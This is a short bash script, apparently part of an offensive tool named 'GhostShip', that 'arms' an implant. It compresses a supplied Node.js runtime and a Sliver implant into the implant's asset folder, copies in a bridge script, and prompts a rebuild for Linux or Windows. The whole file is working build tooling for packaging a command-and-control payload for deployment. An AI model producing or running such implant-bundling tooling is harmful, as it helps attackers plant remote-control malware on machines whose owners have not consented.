#!/bin/bash

# GhostShip Bundler Script
# Use this to "arm" your GhostShip implant with real binaries.

BOLD="\033[1m"
GREEN="\033[0;32m"
RED="\033[0;31m"
NC="\033[0m"

echo -e "${BOLD}GhostShip Bundler${NC}"
echo "-------------------"

if [ "$#" -ne 2 ]; then
    echo -e "${RED}Usage: $0 <path_to_node_binary> <path_to_sliver_implant>${NC}"
    exit 1
fi

NODE_BIN=$1
SLIVER_BIN=$2

if [ ! -f "$NODE_BIN" ]; then echo -e "${RED}Error: $NODE_BIN not found${NC}"; exit 1; fi
if [ ! -f "$SLIVER_BIN" ]; then echo -e "${RED}Error: $SLIVER_BIN not found${NC}"; exit 1; fi

echo -e "[*] Compressing Node.js runtime..."
gzip -c "$NODE_BIN" > implant/core/assets/node.gz

echo -e "[*] Compressing Sliver payload..."
gzip -c "$SLIVER_BIN" > implant/core/assets/payload.gz

echo -e "[*] Updating bridge script..."
cp bridge/nodejs/bridge.js implant/core/assets/client.js

echo -e "${GREEN}✓ Assets prepared successully.${NC}"
echo -e "[!] You now need to rebuild the implant: ${BOLD}make build-linux${NC} or ${BOLD}make build-windows${NC}"
